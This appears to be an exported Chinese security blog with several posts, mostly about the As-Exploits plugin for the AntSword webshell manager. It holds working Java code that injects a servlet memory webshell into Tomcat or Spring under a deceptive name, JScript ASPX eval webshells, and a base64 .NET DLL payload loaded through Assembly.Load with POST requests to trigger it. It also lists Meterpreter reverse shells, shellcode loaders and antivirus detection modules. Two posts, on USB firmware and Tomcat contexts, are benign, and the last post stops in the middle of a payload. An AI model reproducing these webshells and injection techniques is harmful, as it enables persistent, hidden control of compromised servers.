只能addServletMappingDecoded在这里要么用反射，两种方法都try一下。在这里提供一个更好的解决办法，使用ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，自动会处理两种方法的兼容性。Spring下运行截图获取Servlet打入蚁剑内存马再次获取Servlet，发现已经有了，并且在第一位。连接成功卸载Servlet卸载后再次获取Servlet列表虽然我们可以通过setLoadOnStartup把servlet放在第一位，但是面对需要鉴权的shiro等目标打入一个servlet内存马还是有不小的局限性。所以目前filter内存马依旧是主流。但是蚁剑是支持listener类型的，listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加入listener的payload。现有模块介绍基本信息获取当前服务端信息。支持类型：php/jsp/aspxphpjspaspx反弹Shell跟MSF联动支持类型：php/jsp/aspxPayload目前支持以下类型：java/meterpreter/reverse_tcpjava/shell/reverse_tcpjava/meterpreter/bind_tcpjava/shell/bind_tcpphp/meterpreter/reverse_tcpphp/shell/reverse_tcpphp/meterpreter/bind_tcpphp/shell/bind_tcpwindows/meterpreter/reverse_tcpwindows/x64/meterpreter/reverse_tcp内存马一键打入内存Webshell，由于时间仓促，目前仅支持Servlet型内存马。支持类型：jsp可打入的内存马种类：AntSwordBehinderGodzilla-Base64reGerog组件名称为注册的Servlet的名称，可以起一个具有迷惑性的名字来隐藏自己。其中AntSword类型支持Tomcat(5-9)、Spring。打入哥斯拉内存马打入Godzilla-Base64内存马在哥斯拉中连接成功杀软识别数据来源是key师傅的项目：avList通过tasklist /svc获取当前进程列表，识别出其中的杀软。支持类型：php/jsp/aspx目前支持手动跟自动两种获取方式：自动获取自动执行tasklist /svc并分析回显数据。手动获取手动输入tasklist /svc的结果。提权辅助通过systeminfo来获取补丁信息，从而给出提权建议。支持类型：php/jsp/aspx同样支持手动跟自动两种获取方式。屏幕截图获取目标当前屏幕截图。支持类型：jsp/aspxShellCode加载器加载shellcode至内存运行。（shellcode为hex格式，且不能有多余空格或换行）支持类型：aspx以msf为例：msfvenom生成hex格式的shellcode粘贴进输入框，点击exploit收到Meterpreter会话Jar加载器加载Jar到JVM内存中。过程中文件不落地，可用于上传数据库驱动等。支持类型：jsp注意事项本插件仅供合法的渗透测试以及爱好者参考学习，请勿用于非法用途，否则自行承担相关责任。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[As-Exploits内存马兼容Spring]]></title>
    <url>%2Fposts%2FAs-Exploits-Memory-Shell-For-Spring%2F</url>
    <content type="text"><![CDATA[前言最近在对As-Exploits的内存马部分做兼容Spring处理。原来只是照搬了哥斯拉的一些payload，现在需要深入研究一下了。首先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖pageContext了，相关文章以前也写过，不知道的同学可以翻一翻我的博客。过程关于反射的坑在研究过程中可以发现哥斯拉中的payload基本都是用反射实现的，这样的好处就是可以不添加任何依赖。这也是为什么哥斯拉只有8m的原因。去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候报了一个错误123456789101112131415161718192021222324252627public String unLoadServlet() &#123; if (wrapperName != null &amp;&amp; wrapperName.length() &gt; 0 &amp;&amp; urlPattern != null &amp;&amp; urlPattern.length() &gt; 0) &#123; try &#123; Object o = getFieldValue(this.request.getServletContext(), &quot;context&quot;); Field field = o.getClass().getDeclaredField(&quot;context&quot;); field.setAccessible(true); Object standardContext = getFieldValue(o, &quot;context&quot;); Object wrapper = this.invoke(standardContext, &quot;findChild&quot;, wrapperName); Class containerClass = Class.forName(&quot;org.apache.catalina.Container&quot;, false, standardContext.getClass().getClassLoader()); if (wrapper != null) &#123; standardContext.getClass().getDeclaredMethod(&quot;removeChild&quot;, containerClass).invoke(standardContext, wrapper); this.invoke(standardContext, &quot;removeServletMapping&quot;, urlPattern); if (this.getMethodByClass(wrapper.getClass(), &quot;setServlet&quot;, Servlet.class) == null) &#123; this.transform(standardContext, urlPattern); &#125; return &quot;ok&quot;; &#125; else &#123; return &quot;not find wrapper&quot;; &#125; &#125; catch (Exception var8) &#123; return var8.getMessage(); &#125; &#125; else &#123; return &quot;wrapperName or urlPattern is Null&quot;; &#125;&#125;内存马管理模块报了一个这样的错误：115e0d5bERROR:// java.lang.NoSuchMethodException: org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.apache.catalina.Container)adc1b2c定位一下问题出在这里意思就是在StandardContext中找不到removeChild这个方法。调试一下发现，Spring中获取到的StandardContext示例为其一个子类，叫做TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进行改写，如果父类有这个方法应该是可以调用的。开始以为是Spring在StandardContext中删掉了此方法，结果翻到父类StandardContext，发现跟普通的Tomcat一样，调用的org.apache.catalina.core.ContainerBase#removeChildorg.apache.catalina.core.ContainerBase#removeChild后来发现先入为主了，问题不是出在没有这个方法上，而是出在反射的写法上。这里要提一下反射中getMethods 跟getDeclaredMethods 的区别：getMethods 获取所有公有方法（包括父类方法）getDeclaredMethods 获取本类中的所有方法 (只拿本类中的)哥斯拉中用的getDeclaredMethod，也就是只能获取到本类中的方法，自然反射拿不到父类的removeChild。所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就直接调用removeChild方法，不采用反射。在这里我采用了后者。在内存马模块同理，这里直接全部改了，不再用反射。addServletMapping的兼容性问题要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多文章中并没有仔细分析具体的版本号。这里贴一下我研究的结果：tomcat7 只能addServletMappingtomcat8 addServletMapping/addServletMappingDecoded都可以tomcat9 只能addServletMappingDecoded在这里要么用反射，两种方法都try一下。在这里提供一个更好的解决办法，使用ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，自动会处理两种方法的兼容性。核心代码如下：1234567891011121314151617181920212223242526272829 public String addServlet() throws Exception &#123; ServletContext servletContext = this.request.getServletContext(); ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext; Field applicationContextField = applicationContextFacade.getClass().getDeclaredField(&quot;context&quot;); applicationContextField.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade); Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;); standardContextField.setAccessible(true); StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext); Wrapper wrapper = standardContext.createWrapper();// 改为一个有迷惑性的名字 wrapper.setName(name); standardContext.addChild(wrapper); wrapper.setServletClass(this.getClass().getName()); wrapper.setServlet(this); ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext); registration.addMapping(path); registration.setLoadOnStartup(1); if (this.getMethodByClass(wrapper.getClass(), &quot;setServlet&quot;, Servlet.class) == null) &#123; this.transform(standardContext, this.path);//兼容tomcat5/6 this.init((ServletConfig) getFieldValue(wrapper, &quot;facade&quot;)); &#125; return &quot;Success&quot;; &#125;运行截图获取Servlet打入蚁剑内存马再次获取Servlet，发现已经有了，并且在第一位。连接成功卸载Servlet卸载后再次获取Servlet列表最后虽然我们可以通过setLoadOnStartup把servlet放在第一位，但是面对需要鉴权的shiro等目标打入一个servlet内存马还是有不小的局限性。所以目前filter内存马依旧是主流。但是蚁剑是支持listener类型的，listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加入listener的payload。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[关于Tomcat中的三个Context的理解]]></title>
    <url>%2Fposts%2Ftomcat-context%2F</url>
    <content type="text"><![CDATA[p牛在知识星球里问了一个问题：Tomcat中这三个StandardContext、ApplicationContext、ServletContext都是干什么的skay师傅给出了自己的理解：https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew这里来讲一讲我的理解，说的不一定对，仅供参考。Contextcontext是上下文的意思，在java中经常能看到这个东西。那么到底是什么意思呢？根据我的理解，如果把某次请求比作电影中的事件，那么context就相当于事件发生的背景。例如一部电影中的某个镜头中，张三大喊“奥利给”，但是只看这一个镜头我们不知道到底发生了什么，张三是谁，为什么要喊“奥利给”。所以就需要交代当时事情发生的背景。张三是吃饭前喊的奥利给？还是吃饭后喊的奥利给？因为对于同一件事情：张三喊奥利给这件事，发生的背景不同意义可能是不同的。吃饭前喊奥利给可能是饿了的意思，吃饭后喊奥利给可能是说吃饱了的意思。在WEB请求中也如此，在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。ServletContextServletContext是Servlet规范中规定的ServletContext接口，一般servlet都要实现这个接口。大概就是规定了如果要实现一个WEB容器，他的Context里面要有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116package javax.servlet;...public interface ServletContext &#123; String TEMPDIR = &quot;javax.servlet.context.tempdir&quot;; String ORDERED_LIBS = &quot;javax.servlet.context.orderedLibs&quot;; String getContextPath(); ServletContext getContext(String var1);... /** @deprecated */ @Deprecated Servlet getServlet(String var1) throws ServletException; /** @deprecated */ @Deprecated Enumeration&lt;Servlet&gt; getServlets(); /** @deprecated */ @Deprecated Enumeration&lt;String&gt; getServletNames(); void log(String var1); /** @deprecated */ @Deprecated void log(Exception var1, String var2); void log(String var1, Throwable var2); String getRealPath(String var1); String getServerInfo(); String getInitParameter(String var1); Enumeration&lt;String&gt; getInitParameterNames(); boolean setInitParameter(String var1, String var2); Object getAttribute(String var1); Enumeration&lt;String&gt; getAttributeNames(); void setAttribute(String var1, Object var2); void removeAttribute(String var1); String getServletContextName(); Dynamic addServlet(String var1, String var2); Dynamic addServlet(String var1, Servlet var2); Dynamic addServlet(String var1, Class&lt;? extends Servlet&gt; var2); Dynamic addJspFile(String var1, String var2); &lt;T extends Servlet&gt; T createServlet(Class&lt;T&gt; var1) throws ServletException; ServletRegistration getServletRegistration(String var1); Map&lt;String, ? extends ServletRegistration&gt; getServletRegistrations(); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2); javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class&lt;? extends Filter&gt; var2); &lt;T extends Filter&gt; T createFilter(Class&lt;T&gt; var1) throws ServletException; FilterRegistration getFilterRegistration(String var1); Map&lt;String, ? extends FilterRegistration&gt; getFilterRegistrations(); SessionCookieConfig getSessionCookieConfig(); void setSessionTrackingModes(Set&lt;SessionTrackingMode&gt; var1); Set&lt;SessionTrackingMode&gt; getDefaultSessionTrackingModes(); Set&lt;SessionTrackingMode&gt; getEffectiveSessionTrackingModes(); void addListener(String var1); &lt;T extends EventListener&gt; void addListener(T var1); void addListener(Class&lt;? extends EventListener&gt; var1); &lt;T extends EventListener&gt; T createListener(Class&lt;T&gt; var1) throws ServletException; JspConfigDescriptor getJspConfigDescriptor(); ClassLoader getClassLoader(); void declareRoles(String... var1); String getVirtualServerName(); int getSessionTimeout(); void setSessionTimeout(int var1); String getRequestCharacterEncoding(); void setRequestCharacterEncoding(String var1); String getResponseCharacterEncoding(); void setResponseCharacterEncoding(String var1);&#125;ApplicationContext在Tomcat中，ServletContext规范的实现是ApplicationContext，因为门面模式的原因，实际套了一层ApplicationContextFacade。关于什么是门面模式具体可以看这篇文章，简单来讲就是加一层包装。其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等StandardContextStandardContext存在于org.apache.catalina.core.StandardContext。实际上研究ApplicationContext的代码会发现，ApplicationContext所实现的方法其实都是调用的this.context中的方法而这个this.context就是一个实例化的StandardContext对象。所以在我看来，StandardContext是Tomcat中真正起作用的Context，负责跟Tomcat的底层交互，ApplicationContext其实更像对StandardContext的一种封装。用下面这张图来展示一下其中的关系回过头看内存马。以添加filter为例，从上面的分析我们可以知道ApplicationContext跟Standerdcontext这两个东西都有addFilter的方法。那么实际选用哪一个呢？其实两种办法都可以。三梦师傅在基于tomcat的内存 Webshell 无文件攻击技术这篇文章里是利用反射修改了Tomcat的LifecycleState，绕过限制条件调用的ApplicationContext中的addFilter方法。但是因为实际上最终调用的还是StandardContext的addFilter方法，所以我们就可以直接调用StandardContext的addFilter方法进行绕过，从而省去了绕过一堆判断的过程。这种实现具体可以看这个师傅的公众号文章。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[金士顿 DTSE9G2 128G U盘量产踩坑记]]></title>
    <url>%2Fposts%2Fmake-usb-great-again%2F</url>
    <content type="text"><![CDATA[前言买过金士顿U盘的应该都知道一般金士顿是不支持bitlocker的，但是这样又很不方便，就想捣鼓一下。从naivekun师傅那里知道了一个词叫量产，通过给U盘刷固件，就可以让U盘被识别为一个CD或者硬盘，从而支持bitlocker。结果折腾了两天。。。踩了各种坑。一开始刷炸了之后128g缩水成32g，然后又捣鼓捣鼓救了回来，反而扩容到了132g？神秘。前期准备型号：金士顿 DTSE9G2 128G工具：ChipGenius​ ST-TOOL_9000_v3.7F.92参数设置下载工具解压后打开STTOOL_F1_90_v200_00_SZ.exe点击更新识别U盘，然后进入设定固件档案中选择的是2309_hv3_ED3_T_1P.BIN而不是上文教程中的2309_hv3_ED3_M_1P.BIN。因为猜测M是mlc的意思，T是tlc的意思。ChipGenius中显示U盘是tlc，所以换成了2309_hv3_ED3_T_1P.BIN。这里选择容量优先自己是已经低格一遍了，所以选的高格扫描，分类方式选择容量有限。低格一次4-5个小时，高格一次3-5分钟左右。因为我的CE是4个就选的4，Capacity是U盘容量大小，我选择的是自动，也可以设置指定大小。搞完后点击保存，返回上个界面。坑0x01量产工具要在本机运行，不要在虚拟机里面运行，否则会提示奇奇怪怪的错误。被坑了好久0x02开始naivekun师傅是按照这个教程来的[教程] 群联PS2251-09(PS2309)U盘量产，刷完之后发现128g缩水到了32g。帖子下面也有人出现了同样的问题64g的没事，128g的就缩水。刚开始以为是CE太多，固件不兼容啥的，后来发现其实是因为工具默认使用的是速度优先策略，会把低速数据块抛弃，才会导致量产后容量变小但是用起来非常顺畅。0x03格完之后不要急着拔U盘，在U盘里新建一个文件再拔，否则再次插入会不识别U盘。神秘量产过程第一次是选择了低格+高格，贼鸡儿慢。。。完事之后去看设备管理器发现已经量产成功，但是拔出U盘再插入就会无法识别。后来用高格又刷了一遍，刚刷完之后没先拔出来，在U盘里新建了一个txt，然后拔出U盘，再次读取，成功识别！但是怎么变成132g了。。。还扩容了呢测试一下读写360U盘鉴定一下容量还行吧，预期范围之内选中U盘右键，终于出现了bitlocker的选项。。。加密驱动器，成功！最后没事还是不要搞量产orz。]]></content>
      <categories>
        <category>随便写写</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Jscript加载Assembly踩坑记]]></title>
    <url>%2Fposts%2Fjscript-load-csharp-assembly%2F</url>
    <content type="text"><![CDATA[前言最近想要给As-Exploits增加aspx类型的支持，就研究了一下冰蝎跟哥斯拉的实现。由于冰蝎跟哥斯拉都采用的C#类型的shell，所以可以直接调用系统的一些api，并且可以加载任意的shellcode。而蚁剑采用的是传统的Jscript。就想找个办法把它们两者结合起来，用Jscript加载C#的assembly，以此来达到兼容原有shell类型的目的。但是在实现的过程中踩了一些坑，所以就写下这篇文章记录一下。理论支持Assembly这里要先提到一个概念叫Assembly，引用一下rebeyond师傅文章中的话：https://xz.aliyun.com/t/2758在Java中，每个类经过编译之后都单独对应一个class文件，而在.net中则不同，.net中不存在单个类对应的二进制文件，而是引入了一个叫做Assembly（程序集）的概念，已编译的类是以Assembly的形式来承载的，Assembly是供CLR执行的可执行文件。在.NET下，托管的DLL和EXE都称之为Assembly，一个Assembly可以包含多个类。java跟.net有很多相似之处，这里我们可以简单的理解为：.net中的assembly就像java中的class。java中使用defineClass来加载一个类到jvm内存中，同样，.net中可以使用Assembly.Load来把assembly加载到内存中。从Jscript到C#蚁剑用的是Jscript，然而冰蝎哥斯拉用的C#，那么能否用Jscript去调用C#呢？答案是可以的，这里附一张.net framework的框架图可以看到最顶层的如C#,VB,Jscript等语言，他们的底层框架都是通用的，都是在.net framework这个体系内。所以C#编译成的assembly在Jscript中是可以通用的。那么Jscript如何将其加载进去呢？由于其中部分基类库Base Class Library(BCL)是共有的。而Assembly.Load刚好在System.Reflection这个命名空间下面，所以我们就可以在Jscript中调用System.Reflection.Assembly.Load来把C#的assembly加载到内存中。这里可能会有同学问了，既然Jscript也是一门独立的语言，理论上C#能实现的他都能实现，为什么还要大费周折再去加载C#呢？其实也不是没有想过直接用Jscript写。。。但是在实现的过程中发现太蛋疼了，Jscript基本搜不到什么文档，报错也搜不到，本人测试过VS，VS code，rider，都没有Jscript的补全跟高亮，开发起来非常难受。另外一个原因是很多开源工具都用的C#实现，采用assembly加载的方式稍微修改一下就可以快速复用。踩坑过程前面扯了这么多主要是理论，当然实现中没有这么顺利。首先新建一个Class Library项目，这里以弹计算器为例。12345678910111213using System.Diagnostics;namespace AntPayload&#123; public class Run &#123; public override bool Equals(object obj) &#123; Process.Start(&quot;calc.exe&quot;); return true; &#125; &#125;&#125;项目自动编译或者手动编译为dll1csc /t:library AntPayload.csbase64一下1base64 -w 0 AntPayload.dll &gt; AntPayload.txtPayload1TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAEXJD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAANicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOQmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACsJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAPAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAYJwAAAAAAAEgAAAACAAUAaCAAAEQFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACQCAAAjU3RyaW5ncwAAAABcBAAAFAAAACNVUwBwBAAAEAAAACNHVUlEAAAAgAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8AzgEGAEwBzgEGACwAnAEPAO4BAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAArwEGAB4ArwEGAIYAhAEGAAwCfQEKAAQCnAEAAAAAAQAAAAAAAQABAAEAEAAZAhMAPQABAAEAUCAAAAAAxgD9ASkAAQBeIAAAAACGGJYBBgACAAAAAQBqAQkAlgEBABEAlgEGABkAlgEKACkAlgEQADEAlgEQADkAlgEQAEEAlgEQAEkAlgEQAFEAlgEQAFkAlgEQAGEAlgEVAGkAlgEQAHEAlgEQAIEAEwIaAHkAlgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAEVxdWFscwBQcm9jZXNzAE9iamVjdABTdGFydABSdW5UZXN0AAAAAAARYwBhAGwAYwAuAGUAeABlAAAADuw7XR6MQkeND6FGq61D8gAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBQABEkEOCLd6XFYZNOCJBCABAhwIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAADwEACkFudFBheWxvYWQAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkgIDIwMjEAACkBACQ1MzE2OEVCNi04QTE4LTQwM0UtQkM0Ni1CRjU2NUZEQTFBRTYAAAwBAAcxLjAuMC4wAAAAAAAARckPYAAAAAACAAAAHAEAAMglAADIBwAAUlNEU8baoqhTlGdMk7YSVd9Yd5wBAAAARDpcUmlkZXJQcm9qZWN0c1xEbGxUZXN0XEFudFBheWxvYWRcb2JqXFJlbGVhc2VcQW50UGF5bG9hZC5wZGIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMJwAAAAAAAAAAAAAmJwAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGCcAAAAAAAAAAAAAAABfQ29yRGxsTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAAsAwAAAAAAAAAAAAAsAzQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEjAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAaAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAAD4ACwABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABBAG4AdABQAGEAeQBsAG8AYQBkAAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA+AA8AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEEAbgB0AFAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMgAxAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABGAA8AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQQBuAHQAUABhAHkAbABvAGEAZAAuAGQAbABsAAAAAAA2AAsAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEEAbgB0AFAAYQB5AGwAbwBhAGQAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAADg新建web项目，建立test.aspx测试一下1234567&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;% var Payload =Request.Form(&quot;data&quot;); var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); var myPaylaod=myAssebly.CreateInstance(&quot;AntPayload.Run&quot;).Equals(this); myPaylaod.Equals(this);%&gt;POST：1data=xxxx(上文中的payload)可以证实我们的猜想是成功的，可以用Jscript调用System.Reflection.Assembly.Load执行C#的payload。由于蚁剑的aspx一句话是基于jscript的eval的，所以还要通过一层eval给他传进去。web项目中新建base.aspx1&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%eval(Request.Item[&quot;ant&quot;],&quot;unsafe&quot;);%&gt;POST:1ant=var%20Payload%20%3D%22xxxxxxxxx%22%3B%0Avar%20myAssebly%20%3D%20System.Reflection.Assembly.Load(Convert.FromBase64String(Payload))%3B%0Avar%20myPaylaod%3DmyAssebly.CreateInstance(%22AntPayload.Run%22).Equals(this)%3B%0AmyPaylaod.Equals(this)%3B发现第一次是可以正常调用的但是第二次执行就会提示下面的错误1[A]AntPayload.Run 无法强制转换为 [B]AntPayload.Run。类型 A 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。类型 B 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。搜了一下发现没有什么有用的回答，猜测大概是跟java中类重复加载一样的报错。所以就加了一层判断，如果当前存在 AntPayload.Run 这个类型的assembly就不重复进行加载。新建项目test0.aspx测试一下1234567891011121314151617181920212223 &lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;% var Payload=&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAP2QD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAAMicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOAmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACoJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAOAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAUJwAAAAAAAEgAAAACAAUAaCAAAEAFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioA